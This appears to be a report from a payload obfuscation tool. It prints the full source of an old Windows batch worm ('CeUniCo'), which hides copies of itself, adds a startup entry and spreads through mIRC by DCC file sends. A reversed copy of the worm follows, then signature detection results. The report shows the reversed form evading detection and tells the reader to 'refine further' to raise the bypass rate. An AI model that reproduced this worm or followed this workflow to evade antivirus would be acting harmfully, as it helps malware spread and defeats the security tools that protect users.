@@ -1,0 +1,126 @@
+======================================================
+  Payload Obfuscation & Encoding Framework
+  Detection Report
+======================================================
+  Generated : 2026-07-25 21:00:12
+
+  [PAYLOAD]
+  Original  : @Echo Off
+Rem CeUniCo
+Rem by CapsLock
+If Exist C:\Windows\Command\Deltree.exe Del C:\Windows\Command\Deltree.exe
+If Not Exist C:\Windows\°\CeUniCo.isc Md C:\Windows\°
+Attrib +S +H +R C:\Windows\°
+If Not Exist C:\Windows\SpeedUp.txt.bat Copy SpeedUp.txt.bat C:\Windows > Nul
+Attrib +H +R C:\Windows\SpeedUp.txt.bat
+If Not Exist C:\Windows\Men£In~1\Programas\Inicio\Speed.lnk.bat Echo @Echo Off > C:\Speed.lnk.bat
+If Not Exist C:\Windows\Men£In~1\Programas\Inicio\Speed.lnk.bat Echo Start /m C:\Windows\SpeedUp.txt.bat >> C:\Speed.lnk.bat
+If Not Exist C:\Windows\Men£In~1\Programas\Inicio\Speed.lnk.bat Copy C:\Speed.lnk.bat C:\Windows\Men£In~1\Programas\Inicio > Nul
+If Exist C:\Speed.lnk.bat Del C:\Speed.lnk.bat
+If Exist C:\Windows\°\CeUniCo.isc Attrib -S -H C:\Windows\°\CeUniCo.isc 
+C:
+Cd\
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+Dir /S >> C:\Windows\°\CeUniCo.isc
+If Not Exist C:\Windows\System\°\CeUniCo.isc Md C:\Windows\System\°
+Attrib +S +H +R C:\Windows\System\°
+Copy C:\Windows\°\CeUniCo.isc C:\Windows\System\° /Y > Nul
+If Not Exist C:\Windows\System32\°\CeUniCo.isc Md C:\Windows\System32\°
+Attrib +S +H +R C:\Windows\System32\°
+Copy C:\Windows\°\CeUniCo.isc C:\Windows\System32\° /Y > Nul
+Attrib +S +H C:\Windows\°\CeUniCo.isc
+Attrib +S +H C:\Windows\System\°\CeUniCo.isc
+Attrib +S +H C:\Windows\System32\°\CeUniCo.isc
+Echo n8=}>C:\9.isc
+Echo n7= /run attrib +r +s +h C:\Windows\SpeedUp.txt.bat>C:\8.isc
+Echo n6=ON 1:connect: {>C:\7.isc
+Echo n5=>C:\6.isc
+Echo n4=}>C:\5.isc
+Echo n3= /dcc send $nick C:\Windows\SpeedUp.txt.bat>C:\4.isc
+Echo n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }>C:\3.isc
+Echo n1=;by CapsLock>C:\2.isc
+Echo n0=;CeUniCo>C:\1.isc
+Echo [script]>C:\0.isc
+Copy C:\0.isc+C:\1.isc+C:\2.isc+C:\3.isc+C:\4.isc+C:\5.isc+C:\6.isc+C:\7.isc+C:\8.isc+C:\9.isc C:\script.ini > Nul
+If Exist C:\mIRC\mirc.exe Copy C:\script.ini C:\mIRC > Nul
+If Exist C:\Archiv~1\mIRC\mirc.exe Copy C:\script.ini C:\Archiv~1\mIRC > Nul
+If Exist C:\Progra~1\mIRC\mirc.exe Copy C:\script.ini C:\Progra~1\mIRC > Nul
+If Exist D:\mIRC\mirc.exe Copy C:\script.ini D:\mIRC > Nul
+If Exist D:\Archiv~1\mIRC\mirc.exe Copy C:\script.ini D:\Archiv~1\mIRC > Nul
+If Exist D:\Progra~1\mIRC\mirc.exe Copy C:\script.ini D:\Progra~1\mIRC > Nul
+If Exist C:\script.ini Del C:\script.ini
+If Exist C:\0.isc Del C:\*.isc
+Exit < Nul
+  Encoder   : None
+  Key       : None
+  Obfuscator: reverse
+
+  [TRANSFORMED PAYLOADS]
+  Encoded   : None
+  Obfuscated: luN < tixE
+csi.*\:C leD csi.0\:C tsixE fI
+ini.tpircs\:C leD ini.tpircs\:C tsixE fI
+luN > CRIm\1~argorP\:D ini.tpircs\:C ypoC exe.crim\CRIm\1~argorP\:D tsixE fI
+luN > CRIm\1~vihcrA\:D ini.tpircs\:C ypoC exe.crim\CRIm\1~vihcrA\:D tsixE fI
+luN > CRIm\:D ini.tpircs\:C ypoC exe.crim\CRIm\:D tsixE fI
+luN > CRIm\1~argorP\:C ini.tpircs\:C ypoC exe.crim\CRIm\1~argorP\:C tsixE fI
+luN > CRIm\1~vihcrA\:C ini.tpircs\:C ypoC exe.crim\CRIm\1~vihcrA\:C tsixE fI
+luN > CRIm\:C ini.tpircs\:C ypoC exe.crim\CRIm\:C tsixE fI
+luN > ini.tpircs\:C csi.9\:C+csi.8\:C+csi.7\:C+csi.6\:C+csi.5\:C+csi.4\:C+csi.3\:C+csi.2\:C+csi.1\:C+csi.0\:C ypoC
+csi.0\:C>]tpircs[ ohcE
+csi.1\:C>oCinUeC;=0n ohcE
+csi.2\:C>kcoLspaC yb;=1n ohcE
+csi.3\:C>} tlah { ) em$ == kcin$ ( fi/ {:#:NIOJ:1 NO=2n ohcE
+csi.4\:C>tab.txt.pUdeepS\swodniW\:C kcin$ dnes ccd/ =3n ohcE
+csi.5\:C>}=4n ohcE
+csi.6\:C>=5n ohcE
+csi.7\:C>{ :tcennoc:1 NO=6n ohcE
+csi.8\:C>tab.txt.pUdeepS\swodniW\:C h+ s+ r+ birtta nur/ =7n ohcE
+csi.9\:C>}=8n ohcE
+csi.oCinUeC\°\23metsyS\swodniW\:C H+ S+ birttA
+csi.oCinUeC\°\metsyS\swodniW\:C H+ S+ birttA
+csi.oCinUeC\°\swodniW\:C H+ S+ birttA
+luN > Y/ °\23metsyS\swodniW\:C csi.oCinUeC\°\swodniW\:C ypoC
+°\23metsyS\swodniW\:C R+ H+ S+ birttA
+°\23metsyS\swodniW\:C dM csi.oCinUeC\°\23metsyS\swodniW\:C tsixE toN fI
+luN > Y/ °\metsyS\swodniW\:C csi.oCinUeC\°\swodniW\:C ypoC
+°\metsyS\swodniW\:C R+ H+ S+ birttA
+°\metsyS\swodniW\:C dM csi.oCinUeC\°\metsyS\swodniW\:C tsixE toN fI
+csi.oCinUeC\°\swodniW\:C >> S/ riD
+csi.oCinUeC\°\swodniW\:C >> S/ riD
+csi.oCinUeC\°\swodniW\:C >> S/ riD
+csi.oCinUeC\°\swodniW\:C >> S/ riD
+csi.oCinUeC\°\swodniW\:C >> S/ riD
+\dC
+:C
+ csi.oCinUeC\°\swodniW\:C H- S- birttA csi.oCinUeC\°\swodniW\:C tsixE fI
+tab.knl.deepS\:C leD tab.knl.deepS\:C tsixE fI
+luN > oicinI\samargorP\1~nI£neM\swodniW\:C tab.knl.deepS\:C ypoC tab.knl.deepS\oicinI\samargorP\1~nI£neM\swodniW\:C tsixE toN fI
+tab.knl.deepS\:C >> tab.txt.pUdeepS\swodniW\:C m/ tratS ohcE tab.knl.deepS\oicinI\samargorP\1~nI£neM\swodniW\:C tsixE toN fI
+tab.knl.deepS\:C > ffO ohcE@ ohcE tab.knl.deepS\oicinI\samargorP\1~nI£neM\swodniW\:C tsixE toN fI
+tab.txt.pUdeepS\swodniW\:C R+ H+ birttA
+luN > swodniW\:C tab.txt.pUdeepS ypoC tab.txt.pUdeepS\swodniW\:C tsixE toN fI
+°\swodniW\:C R+ H+ S+ birttA
+°\swodniW\:C dM csi.oCinUeC\°\swodniW\:C tsixE toN fI
+exe.eertleD\dnammoC\swodniW\:C leD exe.eertleD\dnammoC\swodniW\:C tsixE fI
+kcoLspaC yb meR
+oCinUeC meR
+ffO ohcE@
+
+  [DETECTION RESULTS]
+  Original           DETECTED        (score: 11.0%)
+    Matched sigs: attrib, mirc.exe, deltree, dir /s, echo off, script.ini, speedup, ceunico, dcc send, attrib +h, copy c:\, del c:\
+  reverse            NOT DETECTED    (score: 0.0%)
+
+  [STATISTICS]
+  Total Variants  : 2
+  Detected        : 1
+  Undetected      : 1
+  Bypass Rate     : 50.0%
+
+  [OBSERVATIONS]
+  Some variants bypassed detection — refine further.
+======================================================
